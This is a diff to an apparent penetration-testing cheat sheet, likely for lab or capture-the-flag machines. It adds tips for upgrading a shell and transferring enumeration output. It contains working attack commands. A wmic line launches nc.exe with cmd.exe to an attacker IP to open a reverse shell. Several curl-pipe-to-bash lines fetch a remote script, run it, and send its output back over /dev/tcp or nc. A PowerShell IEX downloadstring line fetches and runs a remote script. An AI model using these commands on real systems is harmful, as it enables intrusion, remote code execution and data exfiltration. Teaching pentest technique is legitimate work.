@@ -339,8 +339,40 @@ gcc exploit.c -m32 -o exploit
 By default in Windows, you cannot use the <code>runas</code> without on interactive shell/cmd prompt (typical if you just have an nc shell or just remote code execution for some one-liners). So, you can use wmic to launch a process with a password on the cmd line as another user. Bonus points if you have admin creds
 
 ~~~
-
 c:\Users\mssql-svc\Desktop>wmic /user:backdoor2 /password:password123 process call create "c:\users\mssql-svc\desktop\nc.exe 10.10.14.3 444 -e c:\windows\system32\cmd.exe"
+~~~
+
+### upgrade your shell
+
+Often your nc shell lacks a lot of useful features... you can upgrade it to perform better
 
 ~~~
+python -c 'import pty;pty.spawn("/bin/bash")'
+ctrl+z
+stty raw -echo & fg
+~~~
+
+### File transfers with enum scripts
+
+avoid having review your enum script output on the victim machine by hosting your enum script in a webserver and sending output back to your listener
+
+open a webserver to host your enum tool:
+
+<code>python3 -m http.server 8888</code> OR <code>python2 -m Simple.HTTP.Server 8888</code>
+
+open a listener and your attacking system: 
+
+<code>nc -lnvp 8888 -w 5 > output.txt</code>
+
+transfer and execute the enum tool:
+
+<code>curl http://[attackerip:port]/linenum.sh | bash -i > /dev/tcp/[attackerip]/8888</code> or <code>curl http://[attackerip:port]/linenum.sh | bash -i | nc [attackerip] [port]</code>
+
+On Windows, run an smb server to listen for the inbound output from the tool
+
+<code> impacket-smbserver smb ~/smb </code>
+
+<code>PS > IEX (new-object net.webclient).downloadstring('http://[attackerip:port]/enum.ps1') > \\[attackerip]\smb\output.txt</code>
+ 
+ 
 
